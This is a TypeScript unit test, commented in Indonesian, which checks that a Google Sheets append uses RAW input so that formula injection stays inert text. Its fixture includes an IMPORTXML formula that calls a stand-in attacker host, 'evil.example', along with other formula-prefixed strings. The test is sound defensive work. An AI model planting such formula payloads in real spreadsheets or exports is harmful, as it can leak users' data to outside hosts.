import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { SheetsService } from '../src/sheets/sheets.service.ts';

// Imp#4 — formula injection: ekspor/append ke Google Sheets memakai
// valueInputOption RAW sehingga sel berawalan =, +, -, @ TIDAK dievaluasi
// sebagai formula oleh Sheets. (Ekspor CSV sisi FE sudah diuji di
// frontend/test/csvFormula.test.mjs.)
describe('Imp#4 formula injection di Google Sheets', () => {
  it('appendCase mengirim valueInputOption RAW — formula jadi teks inert', async () => {
    const svc = new SheetsService();
    let captured: any = null;
    (svc as any).mock = false;
    (svc as any).sheets = {
      spreadsheets: {
        values: {
          append: async (args: any) => {
            captured = args;
            return { data: {} };
          },
        },
      },
    };
    const formula = '=IMPORTXML("http://evil.example/x","//x")';
    const ok = await svc.appendCase({
      recordUuid: 'formula-test-1',
      client: formula,
      issue: '=1+1',
      picName: '+62812-0000',
      completionNotes: '@SUM(A1:A9)',
    });
    assert.equal(ok, true, 'append sukses');
    assert.ok(captured, 'append sheets terpanggil');
    assert.equal(captured.valueInputOption, 'RAW', 'WAJIB RAW — bukan USER_ENTERED');
    const cells: string[] = captured.requestBody.values[0];
    assert.ok(cells.includes(formula), 'nilai formula diteruskan apa adanya (inert sebagai teks RAW)');
    assert.ok(cells.includes('=1+1') && cells.includes('@SUM(A1:A9)'), 'seluruh sel formula tetap string');
  });
});
